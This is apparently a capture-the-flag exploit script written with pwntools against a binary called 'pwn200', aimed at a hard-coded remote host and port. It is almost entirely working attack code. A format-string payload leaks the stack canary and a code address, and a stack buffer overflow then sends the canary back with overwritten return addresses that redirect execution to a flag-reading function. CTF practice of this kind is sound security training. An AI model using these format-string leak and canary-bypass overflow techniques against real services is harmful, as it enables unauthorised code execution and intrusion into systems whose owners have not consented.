from pwn import *
import time, sys


# local process envirnoment
LOCAL = False
elf_name = "./pwn200"

#retmote args
remote_host = "54.222.255.223"
remote_port = 50002
#remote_host = "127.0.0.1"
#remote_port = 20000
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    context.log_level = "debug"
    mine_env = os.environ
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    #context.log_level = "debug"
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.05)

def mmenu(mindex):
    io.recvuntil("Leave a message\n")
    io.sendline(str(mindex))

def mLogin(content):
    mmenu(1)
    io.recvuntil("Name:")
    dlySend(content)

def get_file(f_name):
    mmenu(2)
    io.recvuntil("input the filename:")
    dlySend(f_name)

def leav_message(mmessg):
    mmenu(3)
    io.recvuntil("Input your msg:")
    dlySend(mmessg)

def s_exp():
    rd_flag_off = 0x626
    sfmt_n = sys.argv[1]
    mLogin("aa"+'\n')
    #pause()
    payload = '1'*0x8 + "_%26$llx_%30$llx_%" + sfmt_n + "$llx_" + '\n'
    #payload = '1'*0x8 + "_%9$llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_" + '\n'
    #payload = '1'*0x8 + "_%" + sys.argv[1] + "$x" + '\n'
    leav_message(payload)
    io.recvuntil("1"*8+'_')
    data = io.recvuntil("_")[:-1]
    lk_canary = int(data, 16)
    log.info("canary data: "+hex(lk_canary))
    data = io.recvuntil("_")[:-1]
    lk_mainVuln = int(data, 16) - 0xE3
    log.info("main vuln addr: "+hex(lk_mainVuln))
    rd_flg_addr = lk_mainVuln - rd_flag_off
    log.info("rd flag addr: "+hex(rd_flg_addr))
    print io.recvuntil("\n")
    #pause()
    payload = 'a'*0x28
    payload += p64(lk_canary)
    payload += p64(rd_flg_addr) * 6
    payload += '\n'
    mLogin(payload)
    print io.recvall()

    ## 561850F34F09 0561850F3552F

if __name__ == "__main__":
    s_exp()
    #pause()
